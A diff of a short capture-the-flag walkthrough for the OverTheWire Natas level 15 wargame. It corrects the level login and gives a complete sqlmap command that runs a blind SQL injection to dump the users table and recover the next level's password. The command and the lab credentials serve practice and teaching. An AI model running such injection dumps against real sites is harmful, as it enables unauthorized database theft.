@@ -1,6 +1,6 @@
 First connect to the website 
   http://natas15.natas.labs.overthewire.org
-Log in with the Username: natas12 and the Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V 
+Log in with the Username: natas15 and the Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB 
 After logging in, we see a 'Username' field and a 'Check existence' button. After clicking on view sourcecode we can see that we have a few things to go from.
 
 <?php
@@ -42,4 +42,4 @@ if(array_key_exists("username", $_REQUEST)) {
 Based on this information, I know I am dealing with a blind SQL injection. However, I found this to be quite difficult. This took me some time.
 I first started by trying to use burp suite to intercept the traffic and then send a cluster bomb attack to the server. For some reason this was not working.
 My second attempt was to use sqlmap. It took me a while to learn how this works, but eventually I was able to come up with a command that wouldn't overload the server, and it would output the password for natas16
-  sqlmap --delay=0.5 --auth-type=Basic --auth-cred=natas15:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V -u http://natas15.natas.labs.overthewire.org/index.php --method=POST --data "username=natas16" --dbms=mysql -b --technique=B --string="This user exists" --level 5 -D natas15 -T users -C username,password --dump --batch
+  sqlmap --delay=0.5 --auth-type=Basic --auth-cred=natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB -u http://natas15.natas.labs.overthewire.org/index.php --method=POST --data "username=natas16" --dbms=mysql -b --technique=B --string="This user exists" --level 5 -D natas15 -T users -C username,password --dump --batch
